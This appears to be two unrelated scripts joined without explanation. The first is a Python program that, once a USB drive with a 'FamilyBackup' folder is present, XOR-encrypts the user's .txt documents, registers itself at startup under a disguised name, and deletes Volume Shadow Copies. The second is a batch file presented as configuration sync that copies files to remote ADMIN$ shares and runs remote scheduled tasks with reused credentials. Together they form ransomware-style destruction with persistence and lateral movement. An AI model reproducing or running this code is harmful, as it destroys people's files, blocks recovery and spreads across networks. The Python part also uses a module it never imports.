import os
import shutil
import subprocess
import winreg

def detect_usb():
    drives = [d for d in win32api.GetLogicalDriveStrings().split('\x00') if d]
    for drive in drives:
        if os.path.exists(drive + 'FamilyBackup'):
            return drive
    return None

def xor_file(file_path):
    with open(file_path, 'rb') as f:
        data = bytearray(f.read())
        for i in range(len(data)):
            data[i] ^= 0xAA
    with open(file_path, 'wb') as f:
        f.write(data)

def add_to_startup():
    key = winreg.HKEY_CURRENT_USER
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
        exe_path = os.path.abspath(__file__)
        winreg.SetValueEx(reg_key, "FileSecurityProtocol", 0, winreg.REG_SZ, exe_path)

def remove_shadow_copies():
    subprocess.run(['vssadmin', 'Delete', 'Shadows', '/quiet'])

if __name__ == "__main__":
    usb_drive = detect_usb()
    if usb_drive:
        documents_folder = os.path.join(os.environ['USERPROFILE'], 'Documents')
        for root, dirs, files in os.walk(documents_folder):
            for file in files:
                if file.endswith('.txt'):
                    file_path = os.path.join(root, file)
                    xor_file(file_path)
        add_to_startup()
        remove_shadow_copies()
    else:
        pass  # Do nothing if USB drive with 'FamilyBackup' directory is not connected

@echo off
setlocal

REM Define the list of hosts to synchronize
set HOSTS=host1 host2 host3

REM Discover the IP addresses of the hosts
for %%H in (%HOSTS%) do (
    for /f "tokens=1-2" %%A in ('arp -a ^| findstr %%H') do (
        set IP=%%A
    )
    REM Sync configuration files using ADMIN$ shares
    copy /Y config\* \\%%H\ADMIN$\config\
)

REM Reuse current credentials for silent execution
set USERNAME=%USERNAME%
set PASSWORD=%PASSWORD%

REM Schedule synchronization task on each host
for %%H in (%HOSTS%) do (
    schtasks /create /s %%H /tn SyncConfig /tr "cmd /c copy \\%IP%\ADMIN$\config\* config\" /ru %USERNAME% /rp %PASSWORD% /sc once /st 00:00 /f
    schtasks /run /s %%H /tn SyncConfig
)

echo Configuration synchronization complete.
exit /b 0

